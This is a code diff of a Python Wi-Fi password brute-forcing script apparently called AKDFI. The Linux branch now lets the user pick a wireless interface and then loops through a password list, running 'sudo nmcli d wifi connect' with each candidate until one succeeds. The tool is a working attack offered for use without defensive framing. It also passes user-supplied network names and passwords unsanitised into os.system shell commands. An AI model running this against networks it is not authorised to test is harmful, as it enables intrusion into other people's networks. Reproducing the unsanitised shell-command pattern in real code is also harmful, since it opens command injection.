@@ -4,11 +4,11 @@ import platform
 import sys
 print("\n*****************************************************************")
 print("\n* AKDFI  --Windows/Linux                                        *")
-print("\n* Version 1.1                                                   *")
+print("\n* Version 2.0                                                   *")
 print("\n*****************************************************************")
 print("\n*****************************************************************")
-print("\n* Copyright of AKD, 2022                                        *")
-print("\n* https://www.adarshkrdubay.github.io                           *")
+print("\n* Copyright of AKD, 2023                                        *")
+print("\n* https://www.adarshkrdubay.tech                                *")
 print("\n*****************************************************************")
 print("\n*****************************************************************")
 print("\n* Please note that this code can be improved by using functions.*")
@@ -82,8 +82,20 @@ if platform.system() == 'Windows':
         except KeyboardInterrupt:
             print("\nExitting... 'Ctrl + c'")
             sys.exit()
-if platform.system() == 'Linux':        
-    os.system("sudo nmcli d wifi list ifname wlp2s0 " )
+if platform.system() == 'Linux':
+    os.system("ls /sys/class/net/ | grep w > .intfear.lis")
+    listfile=open(".intfear.lis","r")
+    intf_list=[]
+    for fill in listfile:
+        intf_list.append(fill.replace("\n",""))
+    print("[+] Wifi interface list")
+    for liss in intf_list:
+        print(liss)
+    interface=input("Enter the interface")
+    if interface not in intf_list:
+        print("[-] Interface not avlable")
+        sys.exit(1)
+    os.system(f"sudo nmcli d wifi list ifname {interface} " )
     wifiname=input("select the wifi you want to bruteforce")
     if wifiname=="":
         print("No name provide")
@@ -95,7 +107,7 @@ if platform.system() == 'Linux':
             password_list.append(fill.replace("\n",""))
     for word in password_list:
                     print(f"trying {word} as password ")
-                    os.system(f"sudo nmcli d wifi connect {wifiname} password {word} ifname wlp2s0 > con.txt")
+                    os.system(f"sudo nmcli d wifi connect {wifiname} password {word} ifname {interface} > con.txt")
                     passcheek=open("con.txt","r")
                     passcheek=passcheek.read()
                     if "successfully" in passcheek:
@@ -104,3 +116,4 @@ if platform.system() == 'Linux':
                                     sys.exit()
                     else:
                             print(f"{word} was not the password")
+
